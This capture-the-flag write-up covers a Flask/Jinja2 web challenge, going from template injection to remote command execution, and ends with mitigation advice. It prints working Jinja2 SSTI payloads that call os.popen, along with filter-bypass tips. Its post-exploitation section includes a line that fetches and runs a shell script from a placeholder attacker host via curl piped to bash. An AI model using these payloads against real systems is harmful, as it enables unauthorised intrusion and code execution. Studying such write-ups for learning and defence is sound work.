---
title: "Web CTF — Flight Panel (SSTI to RCE)"
date: "2025-10-29"
author: "th3mujd11"
platform: "Custom"
difficulty: "medium"
category: "web"
tags: [web, ssti, rce, enumeration, privesc]
target: "http://flight-panel.ctf"
---

# TL;DR

Unauthenticated SSTI in a feedback form parameter allowed template evaluation. Verified with math, escalated to RCE using Jinja2 object chain, then read `/flag.txt`.

```
Foothold: SSTI in `name` -> Jinja2 eval
Exploit: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
Flag: `/flag.txt` via `cat`
```

---

# Target Summary

- URL: `http://flight-panel.ctf`
- Service: `HTTP/1.1` on port `80`
- Tech (fingerprint): `Python`, `Flask`, `Jinja2`

---

# Enumeration

Quick recon of reachable endpoints and tech stack.

```bash
# Baseline scan
whatweb http://flight-panel.ctf

# Crawl/fuzz common paths
feroxbuster -u http://flight-panel.ctf -t 50 -x html,txt,js -o ferox.txt

# Inspect JS for hidden endpoints
curl -s http://flight-panel.ctf/app.js | sed -n '1,200p'
```

Findings:
- `/feedback` accepts `POST` with `name`, `email`, `message`.
- Response echoes `name` inside a template — strong SSTI signal.

---

# Foothold (SSTI)

Probe the reflected context with harmless arithmetic to confirm server-side evaluation.

```http
POST /feedback HTTP/1.1
Host: flight-panel.ctf
Content-Type: application/x-www-form-urlencoded

name={{7*7}}&email=a@b.c&message=hi
```

Expected: Page renders `49` where your name appears. That confirms SSTI.

Next, identify the template engine. Common fingerprints for Jinja2:

- Arithmetic worked; try attribute access or filters:

```http
name={{request.__class__.__name__}}
```

If you see `Request`, you're in Jinja2/Flask context.

---

# Exploitation (Jinja2 to RCE)

Use a built-in object to pivot into Python globals and `os.popen`.

```http
name={{ cycler.__init__.__globals__.os.popen('id').read() }}
```

If blocked, alternate gadgets:

```http
name={{ url_for.__globals__.os.popen('uname -a').read() }}
name={{ lipsum.__globals__.os.popen('ls -la /').read() }}
```

Read the flag:

```http
name={{ url_for.__globals__.os.popen('cat /flag.txt').read() }}
```

Notes:
- If templates are sand-boxed, look for import bypass (e.g., `__mro__`, `__subclasses__()`), or SSRF/file read alternatives.
- If `os` access is filtered, try `config.items()` leakage or `get_flashed_messages.__globals__`.

---

# Post-Exploitation

Lightweight local enum to confirm context and secrets.

```bash
whoami && id
env | sort
ls -la /app || true
```

If a shell is needed, base64-encode payloads to avoid bad chars:

```http
name={{ url_for.__globals__.os.popen('bash -lc "curl http://YOURIP/shell.sh|bash"').read() }}
```

---

# Proof of Flag

```bash
cat /flag.txt
# flag{template-engines-cut-both-ways}
```

---

# Mitigations

- Never render unsanitized user input in templates.
- Disable template evaluation for user-facing fields; use escaping (`{{ variable | e }}`) and strong context separation.
- Consider server-side allowlists for filters/functions or switch to a safe formatter.
- Add WAF rules for common SSTI probes and monitor 500/400 spikes.

---

# References

- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- Flask/Jinja2 docs: https://flask.palletsprojects.com/ / https://jinja.palletsprojects.com/
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings

